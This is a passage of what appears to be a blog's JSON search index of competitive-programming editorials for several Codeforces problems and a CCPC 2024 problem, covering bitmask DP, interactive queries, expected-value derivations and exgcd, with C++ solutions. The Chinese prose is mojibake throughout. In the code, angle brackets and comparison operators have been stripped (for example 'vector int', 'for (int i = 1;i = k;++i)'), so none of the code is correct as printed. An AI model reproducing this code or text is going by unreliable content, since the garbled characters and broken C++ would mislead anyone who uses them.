ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2140E Prime Gaming","path":"/2025/09/10/CF2140E/","content":"E1é¦–å…ˆ $m = 1$ çš„æ—¶å€™åªæœ‰ä¸€ç§å…¨ä¸º $1$ çš„æƒ…å†µï¼Œç­”æ¡ˆä¸º $1$ã€‚ æ¥ä¸‹æ¥åªéœ€è€ƒè™‘ $m = 2$ çš„æƒ…å†µã€‚ç”±äº $n \\le 20$ï¼Œè€ƒè™‘çŠ¶å‹ã€‚ å…ˆé’¦å®šä»å·¦å¾€å³æ•°ç¬¬ $i$ å †çŸ³å¤´çš„ä¿¡æ¯å­˜åœ¨é•¿åº¦ä¸º $n$ äºŒè¿›åˆ¶ä»é«˜ä½å¾€ä½ä½æ•°çš„ç¬¬ $i$ ä½ä¸Šã€‚ç”±äº $c_i = 1/2$ï¼Œæˆ‘ä»¬è®¾äºŒè¿›åˆ¶æŸä¸€ä½ä¸º $0/1$ è¡¨ç¤ºçŸ³å¤´çš„æ•°é‡ä¸º $1/2$ã€‚ è®¾ $dp_{i,S,0/1}$ è¡¨ç¤ºæœ‰ $i$ å †çŸ³å­ï¼ŒçŠ¶æ€ä¸º $S$ ä¸”å½“å‰ Alice ä¸ºå…ˆæ‰‹/åæ‰‹çš„æ—¶å€™æœ€ç»ˆçš„é‚£ä¸€å †çŸ³å¤´çš„æ•°é‡æ˜¯å¦èƒ½ä¸º $2$ã€‚åˆ™æœ‰è½¬ç§»æ–¹ç¨‹ï¼š \\begin{cases} dp_{i,S,0} = \\bigvee_{S' \\in \\mathcal{F}(S)} dp_{i-1,S',1}\\\\ dp_{i,S,1} = \\bigwedge_{S' \\in \\mathcal{F}(S)} dp_{i-1,S',0} \\end{cases}å…¶ä¸­ $\\mathcal{F}(S)$ è¡¨ç¤º $S$ ä¸­çš„æŸä¸€ä½å»æ‰ä»¥åçš„çŠ¶æ€ï¼Œè¿™ä¸ªå¯ä»¥è¿›è¡Œé¢„å¤„ç†ã€‚ è®¾ $nxt_{S,i}$ è¡¨ç¤ºçŠ¶æ€ä¸º $S$ å»æ‰ç¬¬ $i$ å †çŸ³å¤´æ—¶å½¢æˆçš„çŠ¶æ€ã€‚ä½†éœ€è¦æ³¨æ„ï¼Œè¿™ä¸ªçŠ¶æ€ $S$ åœ¨äºŒè¿›åˆ¶ä¸‹çš„é•¿åº¦ä¸€ç›´æ˜¯ $n$ï¼Œå› æ­¤å³ä½¿æ²¡æœ‰è¯¥ä½ç½®çš„ä¿¡æ¯ï¼Œç›´æ¥ç½®ä¸º $0$ å³å¯ã€‚ç”±äºæ˜¯ä»é«˜ä½å¾€ä½ä½å­˜å‚¨ä¿¡æ¯çš„ï¼Œå› æ­¤æ˜¯å½¢å¦‚ $\\texttt{xxxxoyy} \\to \\texttt{xxxxyy}$ çš„åˆå¹¶ã€‚æ˜¾ç„¶å¯ä»¥åˆ†ä¸ºä¸¤ä¸ªéƒ¨åˆ†åˆå¹¶ï¼Œå†™æˆå¦‚ä¸‹å¼å­ï¼ˆæ³¨æ„ $i$ ä¸‹æ ‡æ˜¯ 0-base çš„ï¼‰ï¼š nxt_{s,i} = \\left( \\left\\lfloor \\frac{S}{2^{n-i}} \\right\\rfloor \\cdot 2^{n-i} \\right) + \\left( 2 \\cdot \\left( S \\bmod 2^{n-i-1} \\right) \\right)ä¹Ÿå°±æ˜¯ç­‰ä»·äºå¦‚ä¸‹è¡¨è¾¾å¼ï¼š nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); æœ€åçš„ç­”æ¡ˆä¸º $2^n + \\sum \\limits_{S = 0}^{2^n - 1} dp_{n,S,0}$ã€‚ ä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (),m = read (),k = read (),ans = 0; vector int fl (n); for (int i = 1;i = k;++i) fl[read () - 1] = 1; if (m == 1) puts (1);return; vector vector int dp (1 n,vector int (2,0)),ndp (1 n,vector int (2,0)),nxt (1 n,vector int (n + 1)); for (int S = 0;S (1 n);++S) for (int i = 0;i n;++i) nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); dp[0][0] = dp[0][1] = 0;dp[1 (n - 1)][0] = dp[1 (n - 1)][1] = 1; for (int i = 2;i = n;++i) for (int S = 0;S (1 i);++S) ndp[S (n - i)][0] = 0,ndp[S (n - i)][1] = 1; for (int j = 0;j i;++j) if (fl[j]) ndp[S (n - i)][0] |= dp[nxt[S (n - i)][j]][1],ndp[S (n - i)][1] = dp[nxt[S (n - i)][j]][0]; for (int S = 0;S (1 i);++S) dp[S (n - i)][0] = ndp[S (n - i)][0],dp[S (n - i)][1] = ndp[S (n - i)][1]; for (int S = 0;S (1 n);++S) ans += dp[S][0]; printf (%d ,ans + (1 n)); E2 è·‘äº† 2859 msï¼Œæ€ä¹ˆæ„Ÿè§‰æœ‰ç‚¹è“Ÿå¿ã€‚ E2åœ¨ E1 çš„åŸºç¡€ä¸Šï¼Œæˆ‘ä»¬è€ƒè™‘ä¸€ä¸‹è®¾è®¡çš„çŠ¶æ€æ‰€è¡¨ç¤ºçš„ä¿¡æ¯ã€‚è®¾ $dp_{i,S,0/1}$ è¡¨ç¤ºå½“åœ¨ $S$ çš„çŠ¶æ€ä¸‹ï¼Œè¿™äº›ä½ç½®çš„çŸ³å¤´æ•°é‡å‡ä¸å°äº $k$ æ—¶ï¼Œæœ€åçš„ä¸€å †çš„çŸ³å¤´æ•°æ˜¯å¦èƒ½ä¸å°äº $k$ã€‚ ç­”æ¡ˆç»Ÿè®¡çš„æ—¶å€™ï¼Œæšä¸¾ $k$ ä¸ $i$ï¼Œè¡¨ç¤º $n$ å †çŸ³å¤´ä¸­æœ‰ $i$ å †çš„çŸ³å¤´æ•°é‡ä¸º $[k,m]$ï¼Œ$n - i$ å †çš„çŸ³å¤´æ•°é‡ä¸º $[1,k - 1]$ï¼Œåˆ™ $\\sum\\limits_{S = 0}^{2^n - 1} [ \\operatorname{pop_count}(S) = i ] \\cdot dp_{n,S,0} \\times (m - k + 1)^i \\times (k - 1)^{n - i}$ è¡¨ç¤ºç­”æ¡ˆä¸å°äº $i$ çš„åˆæ³•æ•°é‡ã€‚æ˜¾ç„¶æœ€åä¸€å †çŸ³å¤´çš„æ•°é‡ä¸º $x$ æ—¶çš„è´¡çŒ®ä¼šè¢«æ‹†æˆ $1,2,\\cdots,x$ è¿™ $x$ ä¸ªåœ°æ–¹çš„å•ä¸ª $1$ çš„è´¡çŒ®ï¼Œå› æ­¤æœ€åçš„ç­”æ¡ˆä¸ºï¼š \\sum \\limits_{i = 0}^n\\sum_{S = 0}^{2^n - 1} [ \\operatorname{pop\\_count}(S) = i ] \\cdot dp_{n,S,0} \\times (m - k + 1)^i \\times (k - 1)^{n - i}å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š void solve () int n = read (),m = read (),k = read ();ll ans = 0; vector int fl (n); for (int i = 1;i = k;++i) fl[read () - 1] = 1; vector vector int dp (1 n,vector int (2,0)),ndp (1 n,vector int (2,0)),nxt (1 n,vector int (n + 1)); vector int cnt (n + 1,0); for (int S = 0;S (1 n);++S) for (int i = 0;i n;++i) nxt[S][i] = ((S (n - i)) (n - i)) | ((S ((1 (n - i - 1)) - 1)) 1); dp[0][0] = dp[0][1] = 0;dp[1 (n - 1)][0] = dp[1 (n - 1)][1] = 1; cnt[1] = 1; for (int i = 2;i = n;++i) for (int j = 0;j = n;++j) cnt[j] = 0; for (int S = 0;S (1 i);++S) ndp[S (n - i)][0] = 0,ndp[S (n - i)][1] = 1; for (int j = 0;j i;++j) if (fl[j]) ndp[S (n - i)][0] |= dp[nxt[S (n - i)][j]][1],ndp[S (n - i)][1] = dp[nxt[S (n - i)][j]][0]; for (int S = 0;S (1 i);++S) dp[S (n - i)][0] = ndp[S (n - i)][0],dp[S (n - i)][1] = ndp[S (n - i)][1]; int tot = __builtin_popcount (S); cnt[tot] = (cnt[tot] + dp[S (n - i)][0]) % MOD; for (int i = 0;i = n;++i) for (int k = 1;k = m;++k) ans = (ans + qpow (m - k + 1,i) * qpow (k - 1,n - i) % MOD * cnt[i]) % MOD; printf (%lld ,ans);","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2134E Power Boxes","path":"/2025/09/08/CF2134E/","content":"é¦–å…ˆè€ƒè™‘å‡ºåœ¨ä»€ä¹ˆæƒ…å†µä¸‹åœ¨ä½ç½® $x$ ä¸Šè¿›è¡Œ $\\texttt{throw x}$ æ“ä½œå¯ä»¥ç¡®å®šè¯¥ä½ç½®ä¸Šçš„å€¼ã€‚è®¾ $f_x$ è¡¨ç¤ºä» $x$ å¼€å§‹æ‰”çƒæ—¶ä¼šè¿›è¡Œçš„æ¬¡æ•°ã€‚è‹¥ $f_{x + 1} = f_{x + 2}$ï¼Œæ˜¾ç„¶ $f_x = f_{x + 1} + 1$ï¼Œæ­¤æ—¶æ— æ³•ç¡®å®š $x$ ä½ç½®ä¸Šçš„å€¼ã€‚è‹¥ $f_{x + 1} eq f_{x + 2}$ï¼Œæ­¤æ—¶å¯ä»¥ç¡®å®šã€‚å…·ä½“æ¥è¯´ï¼Œæœ‰ï¼š ans_x = \\begin{cases} 1 & \\texttt{if}\\ f_{x} = f_{x + 1} + 1\\\\ 2 & \\texttt{if}\\ f_{x} = f_{x + 2} + 1 \\end{cases}å‰©ä¸‹è€ƒè™‘å½¢å¦‚ $f_{x + 1} = f_{x + 2}$ï¼Œè€Œ $x$ ä½ç½®ä¸Šå€¼æœªçŸ¥çš„æƒ…å†µã€‚ç”±äº $f_x = f_{x + 1} + 1 f_{x + 1}$ï¼Œå› æ­¤ $x - 1$ ä½ç½®ä¸Šçš„å€¼å¿…å®šå·²çŸ¥ã€‚å°è¯•è¿›è¡Œ $\\texttt{swap x}$ æ“ä½œï¼Œå½¢æˆæ–°çš„å…³ç³»å¿…å®šæ»¡è¶³ $f_x = f_{x + 1} + 1 = f_{x + 2} + 1$ï¼Œæ­¤æ—¶è‹¥ $f_{x - 1} + 1 = f_{x + 1}$ï¼Œåˆ™è¯´æ˜åŸæ¥ $x$ ä½ç½®ä¸Šçš„å€¼ä¸º $2$ï¼Œå¦åˆ™ä¸º $1$ã€‚ ç‰¹åˆ«çš„ï¼Œè€ƒè™‘ $1$ ä½ç½®ä¸ŠæœªçŸ¥çš„æƒ…å†µã€‚å°è¯• $\\texttt{swap 1}$ åè¿›è¡Œ $\\texttt{throw 2}$ æ“ä½œï¼Œè‹¥ $f_2 = f_3 + 1$ï¼Œåˆ™è¯´æ˜åŸæ¥ $1$ ä½ç½®ä¸Šçš„å€¼ä¸º $1$ï¼Œå¦åˆ™ä¸º $2$ã€‚ æœ€åæ¥è¯æ˜æ“ä½œæ•°ä¸è¶…è¿‡ $\\lceil\\frac{3n}{2}\\rceil$ã€‚ è¯æ˜å¦‚ä¸Šæ‰€è¿°ï¼Œ$\\texttt{throw x}$ åœ¨æ¯ä¸ªä½ç½®ä¸Šæ“ä½œæœ‰ä¸”ä»…æœ‰ $1$ æ¬¡ã€‚è‹¥ $f_{x + 1} eq f_{x + 2}$ï¼Œåˆ™ä¸éœ€è¦è¿›è¡Œ $\\texttt{swap x}$ æ“ä½œï¼Œå¦åˆ™å¿…ç„¶æœ‰ $f_{x - 1} eq f_x$ã€‚å› æ­¤ $\\texttt{swap x} \\le \\lceil \\frac{n}{2} \\rceil$ã€‚å‘½é¢˜å¾—è¯ã€‚ å†™çš„æ—¶å€™éœ€è¦æ³¨æ„ï¼Œåœ¨ $\\texttt{swap x}$ ä»¥åéœ€è¦æ›´æ–° $f_{x - 1},f_{x}$ çš„å€¼ï¼Œé˜²æ­¢å‡ºç°é”™è¯¯ï¼ï¼ï¼ ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline int read ();int query (string op,int x) coutop xendl;fflush (stdout); if (op == throw) return read (); else return -1;void solve () int n = read (); vector int ans (n + 1),f (n + 3,0),d (n + 1); for (int i = n;i;--i) if (f[i + 1] != f[i + 2]) f[i] = query (throw,i); ans[i] = d[i] = 1 + (f[i] != f[i + 1] + 1); else f[i] = f[i + 1] + 1; for (int i = n;i;--i) if (ans[i]) f[i] = f[i + d[i]] + 1; continue; if (f[i + 1] != f[i + 2]) f[i] = query (throw,i); ans[i] = d[i] = 1 + (f[i] != f[i + 1] + 1); continue; f[i] = f[i + 1] + 1; if (i == 1) int x = query (swap,1); if (f[2] + 1 == query (throw,2)) ans[1] = 1; else ans[1] = 2; else int x = query (swap,i - 1); f[i] = query (throw,i - 1); ans[i] = d[i] = 1 + (f[i] == f[i + 1] + 1); swap (f[i - 1],f[i]);swap (d[i - 1],d[i]); f[i] = f[i + ans[i]] + 1; cout! ; for (int i = 1;i = n;++i) coutans[i] [i == n]; fflush (stdout);int main () int t = read (); while (t--) solve (); return 0;inline int read () int s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCCPC 2024 é‡åº†ç«™ æœ‰é™å°æ•°","path":"/2025/08/07/CCPC CQ24 Finite Decimal/","content":"æœ‰é™å°æ•° ç»ˆäºæŠŠä¸Šä¸ªèµ›å­£é‡åº†ç«™çš„é¢˜ç›®ç»™è¡¥äº†ã€‚(ä»¥ä¸‹è¯æ˜éƒ¨åˆ†å‚è€ƒ CCPC2024 é‡åº†_è¡¥é¢˜è®°å½•ADFGH) å‘½é¢˜ è‹¥ $b = w2^x5^y$ï¼Œåˆ™æœ€ä¼˜æ¡ä»¶ä¸‹ $d$ ä¸€å®šå¯ä»¥è¡¨ç¤ºä¸º $w2^{x\\prime}5^{y\\prime}$(å…¶ä¸­ $w,z$ ä¸å†å«æœ‰ $2,5$ çš„å¹‚æ¬¡)ã€‚ è¯æ˜ è®¾ $d = z2^{x\\prime}5^{y\\prime}$ï¼Œåˆ™ $\\frac{a}{b} + \\frac{c}{d} = \\frac{az2^{x\\prime}5^{y\\prime} + wc2^x5^y}{wz2^{x + x\\prime}5^{y + y\\prime}}$ã€‚æ¥ä¸‹æ¥å¤„ç†åˆ†å­ï¼Œç”±äºæœ€åæ˜¯æœ‰é™å°æ•°ï¼Œä¸€å®šå­˜åœ¨ $k$ ä½¿å¾— $az2^{x\\prime}5^{y\\prime} + wc2^x5^y = kwz$ æˆç«‹ã€‚ æŠŠ $c,k$ çœ‹ä½œæœªçŸ¥æ•°ï¼Œå†™æˆ exgcd çš„æ ‡å‡†å½¢å¼ï¼š (-w2^x5^y) \\times c + wz \\times k = az2^{x\\prime}5^{y\\prime}æœ‰è§£å½“ä¸”ä»…å½“ $\\gcd(-w2^x5^y,wz) = w \\mid az2^{x\\prime}5^{y\\prime}$ï¼Œä¹Ÿå°±æ˜¯ $w \\mid az$ã€‚ç”±äº $\\gcd (a,b) = 1$ï¼Œåˆ™ $\\gcd (a,w) = 1$ï¼Œå› æ­¤å¾—åˆ° $w \\mid z$ã€‚ åŒç†ï¼ŒæŠŠ $a,k$ å½“ä½œæœªçŸ¥æ•°ï¼Œå¯ä»¥å¾—åˆ° $z \\mid w$ã€‚ ç»¼ä¸Šï¼Œ$z = w$ æˆç«‹ã€‚ å› æ­¤ï¼Œ$\\frac{a}{b} + \\frac{c}{d} = \\frac{a2^{x\\prime}5^{y\\prime} + c2^x5^y}{w2^{x + x\\prime}5^{y + y\\prime}}$ã€‚ç”±äºæœ€åæ˜¯æœ‰é™å°æ•°ï¼Œæ‰€ä»¥å¯ä»¥è¿›ä¸€æ­¥æŠŠå’Œè¡¨ç¤ºä¸º $\\frac{kw}{w2^{x + x\\prime}5^{y + y\\prime}} = \\frac{kw^2}{bd}$ã€‚æšä¸¾ $d$ ä¸­çš„ $x^{\\prime},y^{\\prime}$ï¼Œç„¶åæ±‚ä¸å®šæ–¹ç¨‹ b \\times c - w^2 \\times k = -adç›´æ¥ exgcd åæ±‚å‡º $c$ çš„æœ€å°å€¼å³å¯ã€‚","categories":["Journal"]},{"title":"é¢˜è§£ï¼šCF1453D Checkpoints","path":"/2025/08/06/CF1453D/","content":"æä¾›ä¸€ç§ç›´æ¥åŸºäºæœŸæœ›æ¨è¡¨è¾¾å¼çš„åšæ³•ã€‚ è®¾ $p$ è¡¨ç¤ºèµ°ä¸€æ­¥æˆåŠŸçš„æ¦‚ç‡ï¼Œ$E[x]$ è¡¨ç¤ºä»ä¸€ä¸ªå­˜æ¡£ç‚¹å¼€å§‹ï¼Œè¿˜å‰© $x$ æ­¥çš„è·ç¦»åˆ°è¾¾ä¸‹ä¸€ä¸ªå­˜æ¡£ç‚¹ï¼Œæ‰€éœ€çš„æœŸæœ›æ­¥æ•°ã€‚è‹¥ä¸€æ¬¡æˆåŠŸï¼Œå…±èµ° $x$ æ­¥ï¼Œæ¦‚ç‡ä¸º $p^x$ï¼›è‹¥èµ°åˆ°ç¬¬ $i$ æ­¥æ—¶å¤±è´¥ï¼Œæ¦‚ç‡ä¸º $p^{i-1}(1-p)$ï¼Œä¹‹åéœ€è¦é‡æ–°å¼€å§‹ï¼Œå…±èµ° $E[x]$ æ­¥ã€‚å› æ­¤æœ‰è¡¨è¾¾å¼ï¼š E[x] = x \\times p^x + \\sum \\limits_{i = 1}^x p^{i - 1}(1-p)(i + E[x])ç›´æ¥å°† $p = \\frac{1}{2}$ å¸¦å…¥å¯çŸ¥ï¼š E[x] = x (\\frac{1}{2})^x + 2[1 - (x + 2)(\\frac{1}{2})^{x + 1}] + [1 - (\\frac{1}{2})^x]E[x]\\\\ \\\\ (\\frac{1}{2})^xE[x] = 2 - (\\frac{1}{2})^{x - 1}\\\\ E[x] = 2^{x + 1} - 2å› æ­¤ç›´æ¥æ„é€  $\\texttt{100â€¦}$ çš„å½¢å¼ï¼Œç±»ä¼¼äºŒè¿›åˆ¶æ‹†åˆ†è¿›è¡Œæ„é€ å³å¯ã€‚ç”±äº $E[x]$ ä¸ºå¶æ•°ï¼Œæ‰€ä»¥å¥‡æ•°çš„æƒ…å†µæ˜¾ç„¶æ— è§£ã€‚ ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define pii pair int,int#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3fusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;inline ll read ();void solve () ll x = read (); if (x 1) puts (-1);return; vector ll f (61,0); for (int i = 0;i = 60;++i) f[i] = (1ll (i + 2)) - 2; vector int ans; for (int i = 60;~i;--i) while (x = f[i]) x -= f[i]; ans.push_back (1); for (int j = 1;j = i;++j) ans.push_back (0); assert ((int)ans.size () = 5000); printf (%d ,(int) ans.size ()); for (auto v : ans) printf (%d ,v); puts ();int main () int t = read (); while (t--) solve (); return 0;inline ll read () ll s = 0;int f = 1; char ch = getchar (); while ((ch 0 || ch 9) ch != EOF) if (ch == -) f = -1; ch = getchar (); while (ch = 0 ch = 9) s = s * 10 + ch - 0; ch = getchar (); return s * f;","categories":["Solution"]},{"title":"é¢˜è§£ï¼šCF2129C Interactive RBS","path":"/2025/08/04/CF2129C/","content":"éå¸¸å¥½ç©çš„ä¸€é“é¢˜ï¼ Easy Version é¦–å…ˆä¸éš¾æƒ³åˆ°é¦–å…ˆè¦æ‰¾åˆ°ä¸€å¯¹æ‹¬å·ï¼Œç„¶åå†æ¬¡åŸºç¡€ä¸Šè¯¢é—®å…¶å®ƒçš„ã€‚ç®€å•æ‹†åˆ†ä¸€ä¸‹è¯¢é—®æ¬¡æ•°ï¼Œ$550 = 2 \\times 20 + 500 + \\text{eps}$ï¼Œå‘ç°åœ¨æ‰¾åˆ°æ‹¬å·åéœ€è¦è¯¢é—®ä¸€æ¬¡å¤„ç†ä¸¤ä¸ªæ‹¬å·ã€‚è‡³äºä¸ºä»€ä¹ˆæ˜¯ $2 \\times 20$ï¼ŒåŸå› ä¾¿æ˜¯åœ¨ $[l,r]$ ä¸­å³ä½¿æœ‰å·¦å³æ‹¬å·ï¼Œå®ƒå¯èƒ½ä»¥ $\\texttt{()}$ æˆ– $\\texttt{)(}$ çš„å½¢å¼å‡ºç°ï¼Œå› æ­¤éœ€è¦æ­£åå„è¯¢é—®ä¸€æ¬¡ã€‚ æ¥ä¸‹æ¥è€ƒè™‘å¦‚ä½•ä¸€æ¬¡è¯¢é—®å¤„ç†ä¸¤ä¸ªæ‹¬å·ã€‚å…¶å®æ–¹æ³•å¾ˆå¤šï¼Œé€‚åˆæ‰‹ç©ï¼Œç”¨ä¸Š substring è¿™ä¸ªæ¡ä»¶ï¼Œå°½é‡æ„é€ ä¸å¯¹ç§°æ‹¬å·åºåˆ—å³å¯ã€‚æˆ‘æ„é€ çš„æ˜¯ $\\texttt{()??()}$ï¼Œæœ‰ä»¥ä¸‹å‡ ç§æƒ…å†µï¼š ans = \\begin{cases} 1\\ \\ \\ \\ \\texttt{((((()} \\\\ 2\\ \\ \\ \\ \\texttt{(()(()} \\\\ 3\\ \\ \\ \\ \\texttt{((()()} \\\\ 4\\ \\ \\ \\ \\texttt{(())()} \\\\ \\end{cases}è®¾ $L,R$ ä¸ºäºŒåˆ†æ‰¾åˆ°çš„å·¦/å³æ‹¬å·ä½ç½®ï¼Œä»¥ç¬¬ä¸€ä¸ªä¸ºä¾‹å­ï¼ŒæŸ¥è¯¢çš„å†™æ³•ä¸º query ({L,L,x,y,L,R}ã€‚æ³¨æ„ï¼Œå¦‚æœå‰©ä¸‹æœªç¡®å®šçš„æ•°é‡æ˜¯å¥‡æ•°ï¼Œéœ€è¦ç‰¹æ®Šè€ƒè™‘ã€‚ Medium Version è¯¢é—®æ¬¡æ•°å˜ä¸º $200$ ä»¥å†…ï¼Œéœ€è¦ä¸€æ¬¡è‡³å°‘æµ‹ $6$ ä¸ªã€‚ å¦‚æœæ¥ç€ä»ä¸Šä¸€èŠ‚çš„è¯¢é—®å‡ºå‘ï¼Œç›´æ¥èµ‹å€¼è¯¢é—®åºåˆ—ï¼Œä¼šå‘ç°æƒ…å†µå¹¶ä¸ä¼šæ˜¾è‘—å¢é•¿ï¼ŒåŸå› å°±æ˜¯å—åˆ°ç›¸äº’å½±å“ã€‚æ‰€ä»¥è¿›ä¸€æ­¥æ€è€ƒå¦‚ä½•æ‰èƒ½ç‹¬ç«‹è€ƒè™‘ã€‚ å°è¯•æ„é€  $\\texttt{(?((?((?(â€¦}$ çš„åºåˆ—ã€‚å…·ä½“æ¥è¯´ï¼Œç”¨äºŒè¿›åˆ¶æ•°çš„æ€æƒ³ï¼Œç¬¬ $i$ ä¸ªå¾…æ£€æµ‹ä½ç½®å‡ºç° $2^{i - 1}$ æ¬¡ï¼Œå³ $\\texttt{(x((y((y((z((z((z((z(â€¦}$ã€‚å¾—åˆ°ç­”æ¡ˆåï¼Œä»ä½å¾€é«˜ç¬¬ $i$ ä½ä¸º $1$ï¼Œåˆ™è¯´æ˜ç¬¬ $i$ ä¸ªå¾…æ£€æµ‹çš„ä½ç½®ä¸º $\\texttt{)}$ï¼Œå¦åˆ™ä¸º $\\texttt{(}$ã€‚å½“ç„¶ï¼Œè‹¥å‰©ä½™å¾…æ£€æµ‹ä½ç½®çš„æ•°é‡ä¸è¶³ï¼Œç›´æ¥ç”¨ $L$ è¡¥é½å³å¯ï¼Œå¤„ç†çš„æ—¶å€™ç‰¹åˆ¤ã€‚ æœ€åæ£€éªŒä¸€ä¸‹åˆæ³•æ€§ã€‚è‹¥ä¸€æ¬¡æ£€æµ‹ $x$ ä¸ªï¼Œè¯¢é—®çš„é•¿åº¦ä¸º $3(2^0 + 2^1 + \\cdots + 2^{x - 1}) = 3(2^x - 1)$ã€‚ç”±äºé•¿åº¦ä¸èƒ½è¶…è¿‡ $1000$ï¼Œå› æ­¤ $x_{\\max} = 8$ï¼Œå¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ Hard Version è¯¢é—®æ¬¡æ•°å˜ä¸º $100$ ä»¥å†…ï¼Œéœ€è¦ä¸€æ¬¡è‡³å°‘æµ‹ $13$ ä¸ªã€‚ æ¥ç€ä¸Šä¸€èŠ‚çš„æƒ³æ³•ï¼Œå°è¯•æ„é€ äº’ä¸å½±å“çš„åºåˆ—ã€‚å°è¯•æ„é€ åºåˆ— $\\texttt{(x((y(y((â€¦}$ï¼Œç»„å†…ç”¨ $\\texttt{(}$ åˆ†éš”ï¼Œç»„é—´ç”¨ $\\texttt{((}$ åˆ†éš”ã€‚è®¾ç¬¬ $i$ ä¸ªå¾…æ£€æµ‹çš„ä½ç½®å‡ºç° $dig_i$ æ¬¡ï¼Œåˆ™å¯¹ç­”æ¡ˆçš„è´¡çŒ®ä¸º $sum_i = \\frac{(dig_i + 1)dig_i}{2}$ã€‚è¿›ä¸€æ­¥æ¥è¯´ï¼Œåªè¦æ»¡è¶³ä¸‹å¼æ¡ä»¶å³å¯ï¼š exists i \\in I \\quad \\text{s.t.} \\quad sum_i = \\sum_{j \\in J} sum_jå…¶ä¸­ $I = \\{1,2,\\cdots,|sum|\\}$ï¼Œ$J \\subseteq I \\setminus \\{i\\}$ï¼Œä¸”æ»¡è¶³ $\\forall j,k \\in J, j eq k$ã€‚ å®¹æ˜“å‘ç°ï¼Œå½“ $2sum_{i - 1} \\le sum_i$ æ—¶å¯ä»¥æ»¡è¶³æ¡ä»¶ï¼Œé€šè¿‡æš´åŠ›æ‰“è¡¨å‘ç°ï¼Œæœ€å¤§çš„ç¬¦åˆé¢˜ç›®é™åˆ¶çš„ $dig$ é›†åˆä¸º $\\{1,2,4,6,9,13,19,28,40,57,81,115\\}$ã€‚ä½†æ˜¯æ­¤æ—¶ $|dig| = 12$ï¼ŒæŒ‰ç…§åŸæ¥çš„äºŒåˆ†æ–¹å¼ä¼šè¶…è¿‡é™åˆ¶ã€‚ä»”ç»†æ€è€ƒå¯ä»¥å‘ç°åŸæ¥çš„äºŒåˆ†æ¯ä¸€æ¬¡çš„ check éœ€è¦èŠ±è´¹ $2$ æ¬¡è¯¢é—®ï¼Œä½†æ˜¯æˆ‘ä»¬åªæƒ³è¦çŸ¥é“åºåˆ—ä¸­æ˜¯å¦å­˜åœ¨å·¦å³æ‹¬å·ä»¥åŠæ‹¬å·çš„æ–¹å‘ã€‚å› æ­¤ï¼Œå½“æ–¹å‘æœªç¡®å®šæ—¶ï¼Œæˆ‘ä»¬å°†è¯¢é—®çš„åºåˆ—æ­£åæ‹¼æ¥ï¼Œå¾—åˆ°æœ‰æ— å·¦å³æ‹¬å·çš„ä¿¡æ¯ã€‚ä¸€æ—¦åœ¨æŸæ¬¡è¯¢é—®ä¸­å¾—çŸ¥å­˜åœ¨å·¦å³æ‹¬å·ï¼Œç›´æ¥èŠ±è´¹é¢å¤–çš„ä¸€æ¬¡è¯¢é—®å®šæ–¹å‘ã€‚åœ¨å¾—çŸ¥æ–¹å‘åï¼Œæ¯æ¬¡äºŒåˆ†åªéœ€è¦ä¸€æ¬¡è¯¢é—®å»ç¼©å°èŒƒå›´ã€‚äºŒåˆ†çš„è¯¢é—®æ¬¡æ•°çš„ä¸Šç¡®ç•Œä¸º $\\lceil{\\log (10^3)} + 1 \\rceil = 11$ æ¬¡ï¼Œæ€»è¯¢é—®æ¬¡æ•°çš„ä¸Šç¡®ç•Œä¸º $11 + \\lceil \\frac{10^3}{12} \\rceil = 11 + 84 = 95$ æ¬¡ï¼ŒåŒæ—¶å•æ¬¡è¯¢é—®é•¿åº¦ä¸ä¼šè¶…è¿‡ $1000$ï¼Œå·²ç»å¯ä»¥é€šè¿‡æ­¤é¢˜ã€‚ ä½†èƒ½å¦è¿›ä¸€æ­¥ä¼˜åŒ–å‘¢ï¼ŸæŒ‰ç…§ä¹‹å‰çš„äº’ä¸å½±å“çš„æ¡ä»¶å»æ„é€ åŸºï¼Œå¯ä»¥å°è¯•å†™ä¸€ä¸ª $O(k^2 2^k)$ çš„çŠ¶å‹æ„é€ å¹¶æ‰‹åŠ¨è°ƒæ•´ï¼Œåœ¨æ­¤ä¸è¿‡å¤šèµ˜è¿°ï¼Œç›´æ¥ç»™å‡ºä¸€ç»„é•¿åº¦ä¸º $13$ çš„å¯è¡Œæ„é€ ï¼š$\\{1,2,4,5,8,11,16,23,33,57,74,105,150\\}$ï¼Œå¯ä»¥è¯æ˜ä¸å­˜åœ¨æ¯” $13$ æ›´å¤§ä¸”æ»¡è¶³æ¡ä»¶é™åˆ¶çš„åŸºã€‚æ­¤æ—¶æ€»è¯¢é—®æ¬¡æ•°çš„ä¸Šç¡®ç•Œå¯ä»¥é™ä¸º $11 + \\lceil \\frac{10^3}{13} \\rceil = 11 + 77 = 88$ æ¬¡ï¼Œç†è®ºä¸Šåº”è¯¥å·²ç»è¾¾åˆ°æœ€ä¼˜è§£äº†ã€‚ å®Œæ•´ä»£ç å¦‚ä¸‹ï¼š #include bits/stdc++.h#define init(x) memset (x,0,sizeof (x))#define ll long long#define ull unsigned long long#define INF 0x3f3f3f3f#define pii pair int,intusing namespace std;const int MAX = 1e5 + 5;const int MOD = 1e9 + 7;const int UP = 13;inline int read ();int dig[] = 1,2,4,5,8,11,16,23,33,57,74,105,150;int query (vector int lst) printf (? %d ,(int)lst.size ()); for (auto v : lst) printf (%d ,v); puts ();fflush (stdout); return read ();void solve () int n = read (); int l = 1,r = n,L = -1,R = -1,sure = -1; vector char ans (n + 1); auto check = [] (int l,int r) - bool vector int lst; for (int i = l;i = r;++i) lst.push_back (i); if (sure == 